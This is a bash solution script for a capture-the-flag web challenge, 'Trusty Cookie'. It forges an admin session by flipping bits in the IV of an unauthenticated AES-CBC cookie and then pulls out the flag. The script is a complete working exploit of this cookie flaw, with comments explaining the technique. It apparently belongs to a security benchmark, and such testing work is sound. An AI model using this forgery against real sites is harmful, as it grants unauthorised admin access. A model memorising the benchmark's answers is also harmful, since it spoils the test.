#!/usr/bin/env bash
# XBEN-103-24 — "Trusty Cookie" (tags: crypto, privilege_escalation)
#
# The session cookie is the username encrypted with AES-CBC and nothing else:
# no MAC, no signature. Encryption is not authentication, and CBC in particular
# hands the attacker a lever — the first plaintext block is `AES-decrypt(C1) XOR
# IV`, and the IV is the first sixteen bytes of the cookie the client holds.
#
# So changing the IV changes that block, byte for byte, without knowing the key.
# The username is shorter than a block and null-padded, so `test1` and `admin`
# live entirely in it: XOR the difference into the IV and the same ciphertext
# decrypts to the other name.
#
# `--no-follow` is what makes the `Set-Cookie` readable: the login answers with a
# redirect, and following it here would leave the header behind in a response
# nobody kept.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben103-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
seq="$("$H5I" websec replay req_0 --create --no-follow \
    --set 'method=POST' --set 'path=/login' \
    --set 'form.username=test1' --set 'form.password=test1' \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"

cookie="$("$H5I" websec show "res_$seq" --session "$SESSION" | python3 -c '
import json, re, sys
for name, value in json.load(sys.stdin)["response"]["headers"]:
    if name.lower() == "set-cookie":
        found = re.search(r"session=([0-9a-f]+)", value)
        if found:
            print(found.group(1))
            break
')"
[ -n "$cookie" ] || { echo "no session cookie came back" >&2; exit 1; }

forged="$(python3 -c "
raw = bytes.fromhex('$cookie')
iv, ciphertext = bytearray(raw[:16]), raw[16:]
have = b'test1' + b'\x00' * 11
want = b'admin' + b'\x00' * 11
for index in range(16):
    iv[index] ^= have[index] ^ want[index]
print((bytes(iv) + ciphertext).hex())
")"

seq="$("$H5I" websec replay req_0 --create \
    --set 'path=/welcome' --set "header.Cookie=session=$forged" \
    --session "$SESSION" | python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec show "res_$seq" --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
